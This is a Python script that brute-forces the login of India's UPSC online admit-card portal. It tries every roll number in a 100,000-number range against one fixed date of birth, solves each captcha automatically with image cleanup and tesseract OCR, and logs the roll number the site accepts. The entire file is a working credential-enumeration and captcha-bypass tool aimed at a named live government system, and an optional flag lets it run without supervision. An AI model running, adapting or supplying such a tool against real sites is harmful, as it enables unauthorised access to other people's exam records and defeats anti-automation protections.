import requests
import shutil
from bs4 import BeautifulSoup
import math
import sys,os

#from datetime import datetime
import time

from PIL import Image
from PIL import ImageOps

import subprocess
import post_processing2 as pp

starttime = time.time()

url = 'http://upsconline.nic.in/eadmitcard/upsc_ac2/csp_premark_2015/login.php'
catpcha_url_prefix = 'http://upsconline.nic.in/eadmitcard/upsc_ac2/csp_premark_2015/include/captcha_code_file.php?rand='
# need to replace letter_code, candidate_rollno in below data
data = {'letters_code': '', 'candidate_rollno': '', 'dobrollno': '02/06/1991', 'admit': '', 'examination': '1', 'token': '', 'submitrollnofrm': 'Submit'}
headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}

CAPTCHA_FILENAME = 'captcha.jpg'
CLEANED_CAPTCHA_FILENAME = 'clean_captcha.jpg'
CAPTCHA_REMOVED_PLUS_FILENAME = 'removed_plus.tif'

user_count = 0
total_attempts = 0
no_of_attempts_for_1_roll_no = 0

def get_page(url, session = None, request_type = 'GET', data = dict(), headers = dict(), stream=False):
	try:
		if stream == True and headers == dict():
			# For captcha image
			if session != None:
				response = session.get(url, stream=True)
			else:
				response = requests.get(url, stream = True)
		elif request_type == 'POST':
			# For submitting login form
			if session != None:
				response = session.post(url, data=data, headers=headers)
			else:
				response = requests.post(url, data=data, headers=headers)
		elif session != None:
			# For fetching html pages
			response = session.get(url)
		else:
			# For fetching html pages
			response = requests.get(url)
		return response
	except Exception as e:
		print "Error during fetching page: ",url,"Error:",e
		return None

def beautify(html):
	bsObj = BeautifulSoup(html)
	return bsObj

def find_captcha_image_rand_number(bsObj):
	rand_number = 0
	try:
		img_src = bsObj.find("img", {"id":"captchaimgroll"})["src"]
		index = img_src.find('rand=')
		if index == -1:
			raise Exception('Random Number not present img_src!')
		rand_number = img_src[index+5:]
		print "Random number found: ", rand_number
	except Exception as e:
		print "Error in finding random number: ",e
		return None
	return rand_number

def fetch_and_save_captcha_image(url_prefix, captcha_random_number, session=None):
	response = get_page(url_prefix+captcha_random_number, session = session, stream=True)
	try:
		with open(CAPTCHA_FILENAME, 'wb') as out_file:
			shutil.copyfileobj(response.raw, out_file)
		del response
	except Exception as e:
		print "Error during saving captcha image: ", e

def cleanImage(imagePath):
	image = Image.open(imagePath)
	image = image.point(lambda x: 0 if x<143 else 255)
	borderImage = ImageOps.expand(image,border=20,fill='white')
	borderImage.save(CLEANED_CAPTCHA_FILENAME)

def extract_text_from_image(img):
	p = subprocess.Popen(["tesseract", img, "text_captcha","nobatch","alphanum"], stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	p.wait()
	f = open("text_captcha.txt", "r")
	#Clean any whitespace characters
	captchaResponse = f.read().replace(" ", "").replace("\n", "")
	f.close()
	return captchaResponse

def manually_check_captcha():
	print 'Extracted response is : ', data['letters_code']
	code = raw_input('Is this correct(y/n)?')
	if code != 'y' and code != 'Y':
		code = raw_input('Enter the correct code:')
		data['letters_code'] = code
	return

if __name__ == '__main__':
	roll_no_prefix = '07'
	counter = 0
	try:
		program_counter = open('program_counter.txt','r')
		#program_counter.seek(0, os.SEEK_SET)
		#lines = program_counter.read()
		#lines = lines.split('\n')
		#min_no_str = lines[-2]
		min_no_str = program_counter.read()
		print "min is :",min_no_str
		min_no = int(min_no_str.strip())
		counter = min_no
		print "Starting from min:",str(min_no)
	except Exception as e:
		print "Error in fetching min:",e
		print "Taking min_no as 0"
		min_no = 0
	finally:
		program_counter.close()

	max_no = 99999
	logfile = open('upsc_logs.txt','a')

	try:
		for roll_no_suffix_int in range(min_no, max_no+1):

			user_count += 1
			no_of_attempts_for_1_roll_no = 0
			counter = roll_no_suffix_int

			#if roll_no_suffix_int != min_no:
				#program_counter.write(str(roll_no_suffix_int) + "\n")
				#program_counter.flush()
			roll_no_suffix = str(roll_no_suffix_int)
			if len(roll_no_suffix) == 1:
				roll_no_suffix = '0000' + roll_no_suffix
			elif len(roll_no_suffix) == 2:
				roll_no_suffix = '000' + roll_no_suffix
			elif len(roll_no_suffix) == 3:
				roll_no_suffix = '00' + roll_no_suffix
			elif len(roll_no_suffix) == 4:
				roll_no_suffix = '0' + roll_no_suffix

			data['candidate_rollno'] = roll_no_prefix + roll_no_suffix
			print ''
			print "Checking roll no : ", data['candidate_rollno']

			print 'fetching login page'
			session = requests.Session()
			login_page = get_page(url,session=session)
			print 'Extracting session id'
			sess = session.cookies.get_dict()
			#print sess
			try:
				sessId = sess['PHPSESSID']
				if (sessId is None) or (sessId is ''):
					print "sessId is empty: ",sessId
					continue
				else:
					print "sessId is:", sessId
			except Exception as e:
				print "Exception while extracing session ID: ",e
				continue

			print 'beautifying login page response'
			beautified_login_page = beautify(login_page.text)
			print 'finding captcha_random_number'
			captcha_random_number = find_captcha_image_rand_number(beautified_login_page)

			cont = True

			while cont:
				no_of_attempts_for_1_roll_no += 1
				total_attempts += 1
				print 'fetching captcha image'
				fetch_and_save_captcha_image(catpcha_url_prefix, captcha_random_number,session=session)
				#print 'cleaning captcha image'
				#cleanImage(CAPTCHA_FILENAME)
				print 'processing image'
				pp.do_processing(CAPTCHA_FILENAME, CAPTCHA_REMOVED_PLUS_FILENAME)
				print 'extracting captcha code from image'
				captcha_code = extract_text_from_image(CAPTCHA_REMOVED_PLUS_FILENAME)

				if len(captcha_code) != 6:
					print 'Extracted captcha code is not 6 letters: ', captcha_code, ' ... Fetching another captcha for Roll No: ', data['candidate_rollno'], '...'
					continue

				data['letters_code'] = captcha_code

				if (len(sys.argv) < 2) or (sys.argv[1] != "-moff"):
					manually_check_captcha()

				print 'submitting login form for Roll No: ', data['candidate_rollno'], 'with captcha: ', data['letters_code']
				login_submit_response = get_page (url, session=session, request_type='POST', data=data, headers=headers)
				response_text = login_submit_response.text

				index = response_text.find('Please Enter Correct Captcha Code')

				if index == -1:
					print "Captcha Response was correct."
					index_roll_no = response_text.find('Please Enter Correct')
					if index_roll_no == -1:
						print "Logged in. Correct Roll No is: ", data['candidate_rollno']
						print response_text
						logfile.write(data['candidate_rollno']+" is the correct Roll No.")
						logfile.write("\n")
						logfile.flush()
						#raise Exception("Found Correct Roll No.")
					else:
						print "Unable to login using Roll No: ", data['candidate_rollno']
						print response_text[index_roll_no:index_roll_no+33]
						logfile.write("Roll No:" + data['candidate_rollno'] + ": " + response_text[index_roll_no:index_roll_no+33])
						logfile.write("\n")
						logfile.flush()
					print 'No. of attempts for Roll No:',data['candidate_rollno'],'are:',no_of_attempts_for_1_roll_no
					cont = False
				else:
					print "Incorrect captcha response for Roll No: ", data['candidate_rollno']
					print response_text[index:index+33]
	finally:
		average_attemps_per_user = float(total_attempts) / user_count
		print ''
		print "Total attempts = ", total_attempts
		print "Total users = ", user_count
		prog_time = (time.time()-starttime)
		print "Total time taken: ",prog_time
		print "Average number of attempts per user:",average_attemps_per_user
		print "Number of seconds need per user:",(prog_time/user_count)
		print "Closing all files"
		logfile.close()
		program_counter = open('program_counter.txt','w')
		program_counter.write(str(counter)+"\n")
		program_counter.close()
